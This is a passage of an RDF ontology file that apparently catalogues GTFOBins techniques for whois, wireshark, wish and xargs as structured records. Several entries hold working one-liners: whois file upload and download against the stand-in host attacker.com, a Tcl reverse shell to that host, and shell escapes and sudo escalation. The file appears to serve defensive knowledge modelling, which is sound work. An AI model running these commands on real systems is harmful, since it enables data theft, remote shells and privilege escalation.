mknd:command_whois-file-download a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "whois-file-download" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Fetch remote binary file from a remote TCP port. Run `base64 \"file_to_send\" | nc -l -p 12345` on the attacker box to send the file.",
        "Fetch remote text file from a remote TCP port. Run `nc -l -p 12345 < \"file_to_send\"` on the attacker box to send the file. The file has instances of `$'\\x0d'` stripped." ;
    d3f:uses mknd:executable_whois ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_whois ;
    mknd:provides mknd:function_file-download ;
    mknd:value """RHOST=attacker.com
RPORT=12345
LFILE=file_to_save
whois -h $RHOST -p $RPORT > "$LFILE"
""",
        """RHOST=attacker.com
RPORT=12345
LFILE=file_to_save
whois -h $RHOST -p $RPORT | base64 -d > "$LFILE"
""" .

mknd:command_whois-file-upload a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "whois-file-upload" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Send a binary file to a TCP port. Run `nc -l -p 12345 | tr -d $'\\x0d' | base64 -d > \"file_to_save\"` on the attacker box to collect the file. The file length is limited by the maximum size of arguments.",
        "Send a text file to a TCP port. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file. The file has a trailing `$'\\x0d\\x0a'` and its length is limited by the maximum size of arguments." ;
    d3f:uses mknd:executable_whois ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_whois ;
    mknd:provides mknd:function_file-upload ;
    mknd:value """RHOST=attacker.com
RPORT=12345
LFILE=file_to_send
whois -h $RHOST -p $RPORT "`base64 $LFILE`"
""",
        """RHOST=attacker.com
RPORT=12345
LFILE=file_to_send
whois -h $RHOST -p $RPORT "`cat $LFILE`"
""" .

mknd:command_wireshark-sudo a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "wireshark-sudo" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description """This technique can be used to write arbitrary files, i.e., the dump of one UDP packet.

After starting Wireshark, and waiting for the capture to begin, deliver the UDP packet, e.g., with `nc` (see below). The capture then stops and the packet dump can be saved:

1. select the only received packet;

2. right-click on "Data" from the "Packet Details" pane, and select "Export Packet Bytes...";

3. choose where to save the packet dump.
""" ;
    d3f:uses mknd:executable_wireshark ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_wireshark ;
    mknd:provides mknd:function_sudo ;
    mknd:value """PORT=4444
sudo wireshark -c 1 -i lo -k -f "udp port $PORT" &
echo 'DATA' | nc -u 127.127.127.127 "$PORT"
""" .

mknd:command_wish-non-interactive-reverse-shell a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "wish-non-interactive-reverse-shell" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Run `nc -l -p 12345` on the attacker box to receive the shell." ;
    d3f:uses mknd:executable_wish ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_wish ;
    mknd:provides mknd:function_non-interactive-reverse-shell ;
    mknd:value """export RHOST=attacker.com
export RPORT=12345
echo 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s "> ";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | wish
""" .

mknd:command_wish-shell a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "wish-shell" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:uses mknd:executable_wish ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_wish ;
    mknd:provides mknd:function_shell ;
    mknd:value """wish
exec /bin/sh <@stdin >@stdout 2>@stderr
""" .

mknd:command_wish-sudo a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "wish-sudo" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:uses mknd:executable_wish ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_wish ;
    mknd:provides mknd:function_sudo ;
    mknd:value """sudo wish
exec /bin/sh <@stdin >@stdout 2>@stderr
""" .

mknd:command_xargs-file-read a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "xargs-file-read" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "This works as long as the file does not contain the NUL character, also a trailing `$'\\n'` is added. The actual `/bin/echo` command is executed. GNU version only." ;
    d3f:uses mknd:executable_xargs ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_xargs ;
    mknd:provides mknd:function_file-read ;
    mknd:value """LFILE=file_to_read
xargs -a "$LFILE" -0
""" .

mknd:command_xargs-shell a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "xargs-shell" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "GNU version only.",
        "Read interactively from `stdin`." ;
    d3f:uses mknd:executable_xargs ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_xargs ;
    mknd:provides mknd:function_shell ;
    mknd:value "echo x | xargs -Iy sh -c 'exec sh 0<&1'",
        """xargs -Ix sh -c 'exec sh 0<&1'
x^D^D
""",
        "xargs -a /dev/null sh" .

mknd:command_xargs-sudo a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "xargs-sudo" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "GNU version only." ;
    d3f:uses mknd:executable_xargs ;
    mknd:operating-system "Unix" ;
